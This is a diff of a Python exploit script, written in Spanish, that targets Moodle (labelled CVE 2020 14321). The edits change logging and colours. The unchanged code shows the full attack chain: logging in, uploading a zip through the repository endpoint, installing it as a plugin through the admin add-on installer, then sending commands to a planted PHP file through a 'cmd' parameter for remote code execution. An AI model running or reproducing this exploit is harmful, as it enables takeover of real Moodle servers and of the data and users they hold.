@@ -65,7 +65,7 @@ def crearZip(cadena):
 
 
 def conexionMoodle(url,usuario,password):
-	p1 = logging.progress("[+] Iniciando sesión")
+	#p1 = logging.progress("[+] Iniciando sesión")
 	login_url = url + "/login/index.php"
 	session = requests.Session()
 	r = session.get(login_url)
@@ -80,13 +80,13 @@ def conexionMoodle(url,usuario,password):
 # Iniciar sesión en Moodle
 
 	response = session.post(login_url, data=data)
-	p1.status("Creds " + Color.BLUE + usuario + ":" + password + Color.END)
+	#p1.status("Creds " + Color.BLUE + usuario + ":" + password + Color.END)
 	time.sleep(2)
 # Verificar si se ha iniciado sesión correctamente
 	if "logout" in response.text:
-		p1.success(Color.BLUE + usuario + ":" + password + Color.END + Color.YELLOW + " ✓" + Color.END)
+		#p1.success(Color.BLUE + usuario + ":" + password + Color.END + Color.YELLOW + " ✓" + Color.END)
 		time.sleep(1)
-		print(Color.BLUE + "[+] Inicio de sesión exitoso" + Color.END)
+		print(Color.YELLOW + "[+] Inicio de sesión exitoso" + Color.END)
 	else:
 		print("Error al iniciar sesión")
 	return session
@@ -126,16 +126,16 @@ def RCE(url,sess,cadena,command):
 	"accepted_types[]": [".zip",".zip"],
 	}
 # Subir el plugin
-	p2 = logging.progress("[+] Subiendo zip")
+	#p2 = logging.progress("[+] Subiendo zip")
 	url_upload =url+"/repository/repository_ajax.php"
 	response = sess.post(url_upload, params=data_get, data=files, files=data_file)
 	
 	if response.status_code == 200:
-		p2.success(Color.BLUE + "[+] Se ha subido el zip correctamente"+ Color.END + Color.YELLOW + " ✓" + Color.END)
-		print(Color.BLUE + "[+] Se ha subido el zip correctamente" + Color.END)
+		#p2.success(Color.BLUE + "[+] Se ha subido el zip correctamente"+ Color.END + Color.YELLOW + " ✓" + Color.END)
+		print(Color.YELLOW + "[+] Se ha subido el zip correctamente" + Color.END)
     # install zip file
 	new_url=url+"/admin/tool/installaddon/index.php"
-	p2 = logging.progress("[+] Subiendo zip")
+	#p2 = logging.progress("[+] Subiendo zip")
 	data={
 		"sesskey" : (None,new_sess_key),
         	"_qf__tool_installaddon_installfromzip_form" : (None,"1"),
@@ -148,7 +148,7 @@ def RCE(url,sess,cadena,command):
 	}
 	r=sess.post(new_url, data=data)
 	if r.status_code == 200:
-		print(Color.BLUE + "[+] Se ha instalado el plugin correctamente" + Color.END)
+		print(Color.YELLOW + "[+] Se ha instalado el plugin correctamente" + Color.END)
 	if "Validation successful" not in r.text:
 		print("[-] Error when validing this file, try again!")
 		sys.exit(1)
@@ -162,23 +162,21 @@ def RCE(url,sess,cadena,command):
 	}
 
 	r = sess.post(url + '/admin/tool/installaddon/index.php', data=data)
-	if r.status_code == 200:
-		print("[+] Payload ejecutado correctamente utilize el modo 2 a partir de ahora")
 	if "Current release information" not in r.text:
 		print("[-] Error when confirming this file, try again!")
 		sys.exit(1)
 
-	print("[+] Ruta donde se ejecuta RCE: "+url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php?cmd="+command)
+	print(Color.YELLOW + "[+] Ruta donde se ejecuta RCE: "+url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php?cmd="+command + Color.END)
 	data_get2 = {"cmd" : command}
 	response=sess.get(url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php", params=data_get2)
 	print("\n")
-	print(response.text)
+	print(Color.GREEN + response.text + Color.END)
 	os.remove(cadena + ".zip")
 
 	
 if __name__ == '__main__':
 	
-	print(Color.BLUE + """          
+	print(Color.YELLOW + """          
                      
                 ▐  ▓                               ▓      ▓                        ▐  ▓
              ▐ ███ █                               ███    ███                 ▐█████ █▓                          
@@ -203,7 +201,7 @@ if __name__ == '__main__':
                                 ▌
 			
 	
-																			""" + Color.END + Color.RED	+"""
+																			""" + Color.END + Color.GREEN	+"""
 						***CVE 2020 14321*** 
     
     
@@ -225,7 +223,7 @@ if __name__ == '__main__':
 										help="command")
 	args = vars(ap.parse_args())
 	url = format(str(args['url']))
-	print ('[+] Your target: ' + url)
+	print (Color.YELLOW + '[+] Your target: ' + url + Color.END)
 		# username
 	uname = format(str(args['username']))
 		# password
